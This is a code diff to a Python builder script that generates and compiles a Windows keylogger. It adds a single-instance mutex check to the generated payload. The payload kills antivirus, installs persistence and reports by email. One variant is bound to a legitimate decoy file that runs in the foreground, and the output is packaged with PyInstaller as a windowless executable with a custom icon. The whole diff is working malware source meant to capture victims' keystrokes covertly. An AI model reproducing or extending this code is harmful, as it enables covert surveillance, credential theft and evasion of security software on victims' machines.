@@ -56,21 +56,51 @@ def check_dependencies():
 
 def create_keylogger(file_name, interval, email, password, time_persistent):
     with open(file_name, "w+") as file:
-        file.write("import keylogger\n")
-        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")
-        file.write("technowlogger.kill_av()\n")        
-        file.write(f"technowlogger.become_persistent({time_persistent})\n")
-        file.write("technowlogger.start()\n")
+        file.write("import keylogger, win32event, winerror, win32api\n")
+
+        
+        #Below Codes will check for already running instance,
+        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
+        file.write("def check_and_start():\n")
+        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
+        file.write("\t\tmutex = None\n")
+        file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
+        
+        file.write("\telse:\n")  # if no instance running, going to run Keylogger
+
+        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write("\t\ttechnowlogger.kill_av()\n")        
+        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
+        file.write("\t\ttechnowlogger.start()\n")
+        file.write("check_and_start()\n")        
 
 def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file):
     with open(file_name, "w+") as file:
-        file.write("import keylogger, sys, subprocess\n\n")
-        file.write(f"file_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
-        file.write(f"subprocess.Popen(file_name, shell=True)\n")
-        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")
-        file.write("technowlogger.kill_av()\n")        
-        file.write(f"technowlogger.become_persistent({time_persistent})\n")
-        file.write("technowlogger.start()\n")               
+        file.write("import keylogger, sys, subprocess, win32event, winerror, win32api, threading\n\n")        
+
+        #Codes to Run, Legitimate File on Front End
+        file.write("def run_front_file():\n")        
+        file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
+        file.write(f"\tsubprocess.call(file_name, shell=True)\n\n")
+        
+        #Running Front End File on Different Thread
+        file.write("t1 = threading.Thread(target=run_front_file)\n")
+        file.write("t1.start()\n\n")
+               
+        #Below Codes will check for already running instance,
+        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
+        file.write("def check_and_start():\n")
+        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
+        file.write("\t\tmutex = None\n")
+        file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
+                
+        file.write("\telse:\n")  # if no instance running, going to run Keylogger
+
+        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write("\t\ttechnowlogger.kill_av()\n")        
+        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
+        file.write("\t\ttechnowlogger.start()\n\n")            
+        file.write("check_and_start()\n")            
         
 def obfuscating_payload(file_name):
     gen = DocumentGenerator()
@@ -79,13 +109,13 @@ def obfuscating_payload(file_name):
         file.write(text)
 
 def compile_for_windows(file_name, icon_path):
-    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def compile_for_windows_binded(file_name, icon_path):
-    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
 
 def compile_for_linux(file_name, icon_path):
-    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def del_junk_file(file_name):
     try:
@@ -194,6 +224,3 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"\n{RED}[!] Error : {e}")
         
-
-    
-    
